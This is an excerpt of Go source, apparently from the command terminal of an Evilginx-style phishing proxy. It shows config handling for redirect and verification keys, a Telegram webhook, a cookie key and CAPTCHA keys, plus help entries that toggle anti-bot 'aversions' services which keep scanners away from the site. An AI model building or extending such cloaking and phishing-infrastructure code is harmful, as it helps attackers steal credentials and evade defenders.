...
func (t *Terminal) handleConfig(args []string) error {
	pn := len(args)
	if pn == 0 {
		keys := []string{"domain", "ip", "redirect_key", "verification_key", "verification_token", "redirect_url", "webhook_verbosity", "webhook_telegram", "adminpage_path", "turnstile_sitekey", "turnstile_privkey", "recaptcha_sitekey", "recaptcha_privkey", "useragent_override", "cookie_key"}
		vals := []string{t.cfg.baseDomain, t.cfg.serverIP, t.cfg.redirectParam, t.cfg.verificationParam, t.cfg.verificationToken, t.cfg.redirectUrl, strconv.Itoa(t.cfg.webhook_verbosity), t.cfg.webhook_telegram, t.cfg.adminpage_path, t.cfg.turnstile_sitekey, t.cfg.turnstile_privkey, t.cfg.recaptcha_sitekey, t.cfg.recaptcha_privkey, t.cfg.useragent_override, t.cfg.cookie_key}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 2 {
		switch args[0] {
...
func (t *Terminal) createHelp() {
	...
	h.AddCommand("aversions", "general", "manage aversions configurations", "Configures aversions to help block bots from reaching your site by redirecting bad IPs", LAYER_TOP,
		readline.PcItem("aversions", readline.PcItem("simplebot"), readline.PcItem("nkpbot"), readline.PcItem("killbot"), readline.PcItem("antibotpw"), readline.PcItem("killbot_key"), readline.PcItem("antibotpw_key")))
	h.AddSubCommand("aversions", []string{"simplebot"}, "simplebot on/off", "toggle simplebot on/off")
	h.AddSubCommand("aversions", []string{"nkpbot"}, "nkpbot on/off", "toggle nkpbot on/off")
	h.AddSubCommand("aversions", []string{"killbot"}, "killbot on/off", "toggle killbot on/off")
	h.AddSubCommand("aversions", []string{"antibotpw"}, "antibotpw on/off", "toggle antibotpw on/off")
